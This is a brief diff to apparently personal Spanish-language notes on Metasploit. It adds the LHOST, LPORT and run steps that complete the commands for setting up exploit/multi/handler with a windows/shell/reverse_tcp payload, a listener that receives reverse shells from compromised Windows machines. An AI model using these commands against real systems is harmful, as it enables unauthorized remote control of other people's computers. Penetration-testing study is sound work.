@@ -15,3 +15,6 @@
 ---- msfconsole -q ---> escuchar programa intrusion
 ---- use exploit/multi/handler ---> comando para activar programa intrusion
 ---- set PAYLOAD windows/shell/reverse_tcp  ---> continuacion activar programa intrusion
+---- set LHOST <ip_local> 
+---- set LPORT 4444
+---- run
